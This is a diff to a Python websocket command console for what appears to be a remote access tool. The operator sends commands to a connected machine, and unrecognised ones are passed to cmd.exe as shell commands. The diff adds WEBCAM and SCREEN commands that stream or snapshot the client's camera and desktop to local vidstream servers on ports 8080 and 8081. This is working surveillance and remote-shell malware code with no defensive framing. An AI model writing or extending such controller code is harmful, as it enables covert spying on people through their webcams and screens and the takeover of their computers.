@@ -17,12 +17,29 @@ def b64_2_img(data):
     buff = BytesIO(base64.b64decode(data))
     return Image.open(buff)
 
+def start_video_server():
+    try:
+        from vidstream import StreamingServer
+        global video_server
+        video_server = StreamingServer("127.0.0.1", 8080)
+        video_server.start_server()
+    except:
+        print("Module not found...")
+
+def start_screen_server():
+    try:
+        from vidstream import StreamingServer
+        global screen_server
+        screen_server = StreamingServer("127.0.0.1", 8081)
+        screen_server.start_server()
+    except:
+        print("Module not found...")
+
 async def ainput(prompt: str = "") -> str:
     with ThreadPoolExecutor(1, "AsyncInput") as executor:
         return await asyncio.get_event_loop().run_in_executor(executor, input, prompt)
+
 async def handler(websocket, path):
-    global stored_command
-    global stored_executed
     global config_store
 
     print('#################### Start to TIMESTAMP ##############')
@@ -41,61 +58,95 @@ async def handler(websocket, path):
         return
 
     while True:
-        # print(f'stored flag: {stored_executed}')
-        # if stored_executed:
-        #     print("Kein gespecihertes Kommando")
-        # else:
-        #     print("Gespreichertes Kommando")
-        #     command = stored_command
-        if stored_executed:
-            valid_command = False
-            while not valid_command:
-                # Read Command from user
-                cmdline = await ainput("Command >>")
-                args = shlex.split(cmdline)
-                try:
-                    cmd = args[0].upper()
-                    valid_command = True
-                except:
-                    print("Enter HELP to get info on possible commands!")
-            # Process aliases
-            if cmd in commands.aliases:
-                args[0]=commands.aliases[cmd]
+        # Read Command from user
+        print(" ")
+        cmdline = await ainput("Command >>")
+        args = shlex.split(cmdline)
+        try:
+            cmd = args[0].upper()
+            valid_command = True
+        except:
+            print("Enter HELP to get info on possible commands!")
+            continue
 
-            # Prepare internal satements
-            if cmd == "CD":
-                args.pop(0)
-                if len(args) == 0:
-                    args = ["."]
-                command = ["CD", args]
-            elif cmd == "PWD":
-                command = ["CD", ["."]]
-            elif cmd in commands.direct:
-                args.pop(0)
+        # Process aliases
+        if cmd in commands.aliases:
+            args[0]=commands.aliases[cmd]
+
+
+        # Prepare internal satements
+
+        if cmd == "CD":
+            args.pop(0)
+            if len(args) == 0:
+                args = ["."]
+            command = ["CD", args]
+        elif cmd == "PWD":
+            command = ["CD", ["."]]
+        elif cmd == "WEBCAM":
+            args.pop(0)
+            if len(args) == 0:
+                args = ["STATUS"]
+
+            args[0]=args[0].upper()
+            if args[0] == "STREAM":
                 command = [cmd, args]
-            elif cmd in commands.ps:
-                command = [cmd, []]
-            elif cmd in commands.cmd:
-                command = [cmd, []]
-            elif (not cmd in commands.ps) and (not cmd in commands.cmd):
-                print("No PWR command -> sending to cmd.exe")
-                command = ["SHELL", args]
+                start_video_server()
+            elif args[0] == "STOP":
+                command = [cmd, args]
+                try:
+                    video_server.stop_server()
+                except:
+                    pass
+            elif args[0] == "SNAP":
+                command = [cmd, args]
+            elif args[0] == "STATUS":
+                command = [cmd, args]
+            else:
+                print("Unknown WEBCAM command")
+                continue
+        elif cmd == "SCREEN":
+            args.pop(0)
+            if len(args) == 0:
+                args = ["STATUS"]
+            args[0]=args[0].upper()
+            if args[0] == "STREAM":
+                command = [cmd, args]
+                start_screen_server()
+            elif args[0] == "STOP":
+                command = [cmd, args]
+                try:
+                    screen_server.stop_server()
+                except:
+                    pass
+            elif args[0] == "SNAP":
+                command = [cmd, args]
+            elif args[0] == "STATUS":
+                command = [cmd, args]
+            else:
+                print("Unknown SCREEN command")
+                continue
 
-            command_json = json.dumps(command)
-            stored_executed=False
-            stored_command=command_json
-        else:
-            command_json=stored_command
+        elif cmd in commands.direct:
+            args.pop(0)
+            command = [cmd, args]
+        elif cmd in commands.ps:
+            command = [cmd, []]
+        elif cmd in commands.cmd:
+            command = [cmd, []]
+        elif (not cmd in commands.ps) and (not cmd in commands.cmd):
+            print("No PWR command -> sending to cmd.exe")
+            command = ["SHELL", args]
+        command_json = json.dumps(command)
 
         # print('#################### Start to SEND ##############')
-        pprint(command_json)
+        #pprint(command_json)
         try:
             data = await websocket.send(command_json)
             # print(f'Date: {data}')
         except:
             # print("Connection lost - Sending")
             return
-
 
         # print('#################### Start to RECEIVE ##############')
         try:
@@ -118,16 +169,15 @@ async def handler(websocket, path):
         else:
             for line in result:
                 print(line.rstrip())
-        print("\n")
 
 # ############
 
 global stored_command
 global stored_executed
 global config_store
+global video_server
 
-stored_command=[]
-stored_executed=True
+
 # Store default config
 config_store={}
 config_store["Debugging"]=True
